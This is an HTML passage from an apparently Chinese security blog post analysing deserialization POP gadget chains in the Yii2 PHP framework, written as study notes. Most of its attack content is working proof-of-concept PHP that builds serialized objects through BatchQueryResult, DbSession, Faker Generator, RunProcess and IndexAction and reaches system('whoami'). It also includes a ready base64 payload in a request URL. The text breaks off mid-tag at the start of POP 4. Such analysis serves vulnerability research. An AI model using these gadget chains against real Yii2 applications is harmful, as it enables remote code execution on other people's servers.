href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="POP-1"><a href="#POP-1" class="headerlink" title="POP 1"></a>POP 1</h3><blockquote><p>跟着大师傅分析一下</p></blockquote><p>入口点 <code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// make sure cursor is closed</span><br>        <span class="hljs-keyword">$this</span>-&gt;reset();<br>    &#125;<br><br><br><span class="hljs-comment">// 这里的 _dataReader 参数可控，所以可以利用这个参数去执行其他类的 close() 函数</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_dataReader !== <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader-&gt;close();<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_batch = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_value = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_key = <span class="hljs-literal">null</span>;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/web/DbSession.php 中的 close() 函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;getIsActive()) &#123;<br>            <span class="hljs-comment">// prepare writeCallback fields before session closes</span><br>            <span class="hljs-keyword">$this</span>-&gt;fields = <span class="hljs-keyword">$this</span>-&gt;composeFields();<br>            YII_DEBUG ? session_write_close() : @session_write_close();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIsActive</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> session_status() === PHP_SESSION_ACTIVE;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/web/MultiFieldSession.php</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">composeFields</span>(<span class="hljs-params">$id = <span class="hljs-literal">null</span>, $data = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $fields = <span class="hljs-keyword">$this</span>-&gt;writeCallback ? call_user_func(<span class="hljs-keyword">$this</span>-&gt;writeCallback, <span class="hljs-keyword">$this</span>) : [];<br>        <span class="hljs-keyword">if</span> ($id !== <span class="hljs-literal">null</span>) &#123;<br>            $fields[<span class="hljs-string">&#x27;id&#x27;</span>] = $id;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($data !== <span class="hljs-literal">null</span>) &#123;<br>            $fields[<span class="hljs-string">&#x27;data&#x27;</span>] = $data;<br>        &#125;<br>        <span class="hljs-keyword">return</span> $fields;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/rest/IndexAction.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;checkAccess) &#123;<br>            call_user_func(<span class="hljs-keyword">$this</span>-&gt;checkAccess, <span class="hljs-keyword">$this</span>-&gt;id);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;prepareDataProvider();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027211239754.png" alt="image-20211027211239754"></p><p><code>call_user_func</code> 的一个不常见特性：<a href="https://www.php.net/manual/zh/language.types.callable.php">https://www.php.net/manual/zh/language.types.callable.php</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027225853020.png" alt="image-20211027225853020"></p><p>主要的链就是</p><p>利用 <code>BatchQueryResult.php</code> 中的 <code>BatchQueryResult</code> 的析构函数为入口，在执行<code>reset()</code> 函数中的 <code>close()</code> 函数时因为这里的<code>_dataReader</code>参数可控所以有两种选择，第一时找其他类的 <code>close()</code>函数来执行第二个是寻找<code>__call</code> 魔术方法，这里先选择了第一种，找到了<code>DbSession.php</code> 中<code>DbSession</code>类的<code>close()</code>方法然后执行到<code>MultiFieldSession</code>的<code>composeFields()</code>方法，调用里面的<code>call_user_func()</code>函数去执行某个类中的方法，这里就寻找到了两个可以被调用的<code>run()</code>方法<code>IndexAction.php</code> 和 <code>CreateAction.php</code>，大佬都是使用 <code>IndexAction.php</code> 来构造的POC</p><p>利用<code>IndexAction</code> 构造POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> DbSession();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> IndexAction();<br>            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [$a, <span class="hljs-string">&#x27;run&#x27;</span>];;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php?r=serialize/</span>serialize&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX0<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027124445391.png" alt="image-20211027124445391"></p><p>尝试利用 <code>CreateAction.php</code> 构造 POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> DbSession();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> CreateAction();<br>            <span class="hljs-comment">// 这里 DbSession 继承了 MultiFieldSession 所以直接声明变量</span><br>            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [$a, <span class="hljs-string">&#x27;run&#x27;</span>];;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><p>这样也是可以的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027234634925.png" alt="image-20211027234634925"></p><blockquote><p>POC 的编写可以有根据程序的格式来写，和一般的不一样，看别人分析起来很顺利，看看自己就是憨批</p></blockquote><h3 id="POP-2"><a href="#POP-2" class="headerlink" title="POP 2"></a>POP 2</h3><p>这里主要选择上面的另一条路寻找 <code>__call()</code> ，感觉这个可行，然后分析参数是否可控</p><p>最后看见大师父们找的<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> $providers = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">protected</span> $formatters = <span class="hljs-keyword">array</span>();<br>    ………………<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$method, $attributes</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;format($method, $attributes);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params">$formatter, $arguments = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;getFormatter($formatter), $arguments);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params">$formatter</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;formatters[$formatter])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter];<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;providers <span class="hljs-keyword">as</span> $provider) &#123;<br>            <span class="hljs-keyword">if</span> (method_exists($provider, $formatter)) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter] = <span class="hljs-keyword">array</span>($provider, $formatter);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">InvalidArgumentException</span>(sprintf(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, $formatter));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>还是可以利用 <code>call_user_func_array()</code></p></blockquote><p>这里的可控参数有<code>$formatters</code> 和 <code>$providers</code> 在<code>__call()</code> 函数中<code>$method</code> 就是 <code>close</code> <code>$attributes</code> 为空，在执行<code>format</code> 函数时传入的值就是 <code>close</code> 和 空，所以在执行 <code>getFormatter()</code> 函数时，就会选取 <code>$formatters</code> 数组中的一个以 <code>$formatter</code> 也就是 <code>close</code> 为键的值这一点我们是可以控制的，并且我们在后面执行<code>call_user_func_array()</code>时也需要选取一个无参函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">namespace</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br> <br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028173015512.png" alt="image-20211028173015512"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028005049779.png" alt="image-20211028005049779"></p><h3 id="POP-3"><a href="#POP-3" class="headerlink" title="POP 3"></a>POP 3</h3><p>这里选择的思路就是选择其他的<code>__deestruct()</code>析构函数来调用<code>__call()</code>，这里的<code>__call()</code> 可以使用 POP2 的 <code>__call()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028105033811.png" alt="image-20211028105033811"></p><p>这里的<code>$this-&gt;processes</code>参数可控，然后控制这个参数去调用<code>Generator</code>类中的<code>__call()</code>去执行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//vendor/codeception/codeception/ext/RunProcess.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $processes = [];<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;stopProcess();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopProcess</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (array_reverse(<span class="hljs-keyword">$this</span>-&gt;processes) <span class="hljs-keyword">as</span> $process) &#123;<br>            <span class="hljs-comment">/** <span class="hljs-doctag">@var</span> $process Process  **/</span><br>            <span class="hljs-keyword">if</span> (!$process-&gt;isRunning()) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;output-&gt;debug(<span class="hljs-string">&#x27;[RunProcess] Stopping &#x27;</span> . $process-&gt;getCommandLine());<br>            $process-&gt;stop();<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;processes = [];<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span>&#123;<br>        <span class="hljs-keyword">private</span> $processes;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;processes = [<span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>()];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;isRunning&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> $id;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>\<span class="hljs-title">RunProcess</span>;<br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> RunProcess()));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 这里也可以借助 CheckAction 的 Run 方法来执行</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028111936675.png" alt="image-20211028111936675"></p><blockquote><p>主要还是利用之前的链子稍微修改了一下</p></blockquote><h3 id="POP-4"><a href="#POP-4" class="headerlink" title="POP 4"></a>POP 4</h3><p>这里找到了另外一个析构函数</p><p> 这里采用的是利用<code>__toString()</code>魔术方法来构造 pop 链</p><p>找到这个析构函数，然后跟进 <code>clearAll()</code> 函数</p><p><img 